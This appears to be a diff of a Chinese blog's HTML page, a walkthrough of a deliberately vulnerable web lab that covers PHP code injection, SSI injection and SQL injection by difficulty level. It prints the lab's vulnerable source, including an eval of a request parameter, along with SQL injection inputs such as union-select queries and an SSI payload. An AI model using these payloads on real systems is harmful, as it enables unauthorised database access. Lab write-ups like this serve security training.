@@ -163,7 +163,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.2k 字
+      2.4k 字
     </span>
   
 
@@ -173,7 +173,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      32
+      35
        分钟
     </span>
   
@@ -509,8 +509,43 @@ if(isset($_POST[&quot;target&quot;]))
 
 &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt;
 }</code></pre><p>&nbsp;&nbsp;low等级下不进行过滤</p>
-<h4 id="nbsp-nbsp-medium-6"><a href="#nbsp-nbsp-medium-6" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h4><p>&nbsp;&nbsp;medium和high登记下使用同一个</p>
-<pre><code>&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt;</code></pre>
+<h4 id="nbsp-nbsp-medium-6"><a href="#nbsp-nbsp-medium-6" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h4><p>&nbsp;&nbsp;medium和high登记下使用同一个函数进行过滤</p>
+<pre><code>&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt;</code></pre><p>&nbsp;&nbsp;无法绕过</p>
+<h3 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h3><p>&nbsp;&nbsp;这关容器加载失败了参考网上攻略。有两种攻击方式，一个是xss，还有就是构造下面的payload</p>
+<pre><code>&lt;!--@echo var =&quot;DOCUMEN_NAME&quot;--&gt;</code></pre><h3 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h3><h4 id="nbsp-nbsp-low-7"><a href="#nbsp-nbsp-low-7" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h4><p>&nbsp;&nbsp;很经典的注入漏洞</p>
+<pre><code>1&apos; or 1=1 # //爆出所有表项
+1‘ order by 7 # //8报错而7未报错说明由7列
+1&apos; union select 1,user(),@@version,4,5,6,7 # //输出用户名等信息</code></pre><p>&nbsp;&nbsp;看看源码</p>
+<pre><code>switch($_COOKIE[&quot;security_level&quot;])
+{
+
+    case &quot;0&quot; :
+
+        $data = no_check($data);
+        break;
+
+    case &quot;1&quot; :
+
+        $data = sqli_check_1($data);
+        break;
+
+    case &quot;2&quot; :
+
+        $data = sqli_check_2($data);
+        break;
+
+    default :
+
+        $data = no_check($data);
+        break;
+
+}//等级low时不做任何检测</code></pre><h4 id="nbsp-nbsp-medium-7"><a href="#nbsp-nbsp-medium-7" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h4><p>&nbsp;&nbsp;medium等级对引号和反斜杠进行了过滤</p>
+<pre><code>function sqli_check_1($data)
+{
+
+return addslashes($data);
+
+}</code></pre>
             </article>
             <hr>
             <div>
